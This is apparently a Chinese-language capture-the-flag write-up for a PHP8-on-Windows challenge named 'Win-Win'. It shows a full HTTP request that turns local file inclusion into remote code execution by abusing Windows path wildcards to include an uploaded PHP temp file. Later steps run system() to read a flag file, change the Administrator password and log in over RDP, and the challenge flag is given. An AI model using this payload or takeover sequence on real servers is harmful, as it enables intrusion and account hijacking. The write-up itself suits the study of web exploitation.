# Win-Win

環境：PHP8 + Windows 潮爆

🐂🍺隊友 [@ginoah](https://twitter.com/g1n04h) 發現 `C:/windows/system32/winevt/logs/application.evtx` 裡面有 

`C:\THIS_IS_A_SECRET_PATH_107B1177348CC063A0713838282B1C27892D5FE2\php`

所以知道 tmp 目錄在 `upload_tmp_dir="C:\THIS_IS_A_SECRET_PATH_107B1177348CC063A0713838282B1C27892D5FE2\tmp"`

配合 windows 路徑正規化特性，就可以LFI to RCE:

```
POST /?win=..\..\THIS_IS_A_SECRET_PATH_107B1177348CC063A0713838282B1C27892D5FE2\tmp\php<<<<<<<.tmp HTTP/1.1
Host: 9c26ca6d8b9f60f0e082f53ea66a79d2.winwin.pwnable.org
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryDAZIAHqBWWxshbhU
Content-Length: 200


------WebKitFormBoundaryDAZIAHqBWWxshbhU
Content-Disposition: form-data; name="n"; filename="f"
Content-Type: text/plain

<?php system('whoami');?>
------WebKitFormBoundaryDAZIAHqBWWxshbhU--
```

接著找flag，發現:

```
<?php system('cmd /c "type ..\\Users\\Administrator\\Desktop\\flag.txt"');?>
Take a screenshot!
```

居然要截圖才有flag...WTF

但截圖莫名一直失敗

於是最後直接打tunnel+改Administrator密碼，然後RDP上去看flag

=>

`flag{3ebc6994110c4a10a54f7680b2181876}`
